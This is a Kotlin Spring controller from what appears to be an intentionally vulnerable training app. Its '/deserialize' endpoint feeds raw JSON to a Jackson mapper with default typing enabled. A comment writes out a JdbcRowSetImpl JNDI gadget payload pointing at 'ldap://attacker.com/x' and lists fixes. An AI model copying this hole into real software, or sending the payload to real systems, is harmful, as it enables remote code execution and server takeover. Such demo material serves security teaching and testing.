package com.example.vulnerable.controller

import com.example.vulnerable.model.TypedPayload
import com.example.vulnerable.model.User
import com.fasterxml.jackson.databind.ObjectMapper
import org.springframework.http.ResponseEntity
import org.springframework.web.bind.annotation.*

@RestController
@RequestMapping("/api/users")
class UserController(private val objectMapper: ObjectMapper) {

    private val users = mutableListOf(
        User(1, "admin", "admin@example.com", "ADMIN"),
        User(2, "alice", "alice@example.com", "USER"),
        User(3, "bob", "bob@example.com", "USER")
    )

    @GetMapping
    fun getAll(): List<User> = users

    @GetMapping("/{id}")
    fun getById(@PathVariable id: Long): ResponseEntity<User> {
        val user = users.find { it.id == id }
        return if (user != null) ResponseEntity.ok(user) else ResponseEntity.notFound().build()
    }

    @PostMapping
    fun create(@RequestBody user: User): User {
        val newUser = user.copy(id = (users.maxOfOrNull { it.id } ?: 0) + 1)
        users.add(newUser)
        return newUser
    }

    // CVE-2021-20190 (Jackson Databind 2.12.3, CVSS 8.1):
    // enableDefaultTyping が有効な ObjectMapper で @JsonTypeInfo(Id.CLASS) な
    // フィールドをデシリアライズすると、既知のガジェットクラスを使った
    // SSRF や RCE が可能。
    // 攻撃例 (Content-Type: application/json):
    //   {"data": ["com.sun.rowset.JdbcRowSetImpl",
    //             {"dataSourceName":"ldap://attacker.com/x","autoCommit":true}]}
    // 修正: jackson-databind 2.12.7.1 以上、default typing を無効化、
    //       PolymorphicTypeValidator で許可クラスを制限する。
    @PostMapping("/deserialize")
    fun deserialize(@RequestBody json: String): ResponseEntity<Any> {
        return try {
            val result = objectMapper.readValue(json, TypedPayload::class.java)
            ResponseEntity.ok(mapOf("status" to "ok", "type" to result.data?.javaClass?.name))
        } catch (e: Exception) {
            ResponseEntity.badRequest().body(mapOf("error" to e.message))
        }
    }
}
